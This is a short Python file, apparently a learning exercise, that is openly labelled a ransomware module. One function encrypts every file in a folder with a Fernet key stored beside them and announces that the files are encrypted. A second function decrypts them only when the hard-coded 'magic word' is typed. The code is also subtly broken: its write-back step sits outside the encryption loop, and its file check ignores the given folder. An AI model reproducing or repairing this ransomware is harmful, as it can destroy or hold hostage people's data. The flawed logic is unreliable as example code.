"""
 ransomware module contain the encryption and decryption of data.
"""
import os
from cryptography.fernet import Fernet

# encryption method
def encryption(folder_path: str)-> None:
    """
    encryption function take directory path as input string and perform encryption 
    on files else then the given mentioned files in IF below.
    
    Parameters
    ----------
    folder_path: str
        contain the folder_path where it perfomr encryption.
    
    Return
    ------
    None
    """
    files = []
    # 'E:/Ekkel AI task practice/Python_basic_14_07_2023/modules/ransom_testing'
    path_abs=os.listdir(folder_path)
    for file in path_abs:
        if file == "Ransomware.py" or file == "thekey.key"  or file == "decrypter.py":
            continue
        if os.path.isfile(file):
            files.append(file)
    print(files)
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
    print("All your files have been encrypted!!")


def decryption(folder_path: str)-> None:
    """
    decryption function take directory path as input string and perform decryption 
    on encrypted files in that folder.
    
    Parameters
    ----------
    folder_path: str
        contain the folder_path where it perfomr decryption.
    
    Return
    ------
    None
    """
    files = []
     # 'E:/Ekkel AI task practice/Python_basic_14_07_2023/modules/ransom_testing'
    path_abs=os.listdir(folder_path)
    for file in path_abs:
        if file == "Ransomware.py" or file == "thekey.key" or file == "decrypter.py":
            continue
        if os.path.isfile(file):
            files.append(file)
    print(files)
    with open("thekey.key", "rb") as key:
        secretkey = key.read()
    secretphrase = "VirusZzWarning"
    user_phrase = input("Enter the magical word!!\n")
    if user_phrase == secretphrase:
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        print("Congrats! You have successfully got back your files")
    else:
        print("Sorry! Go Learn the Magic word!!")
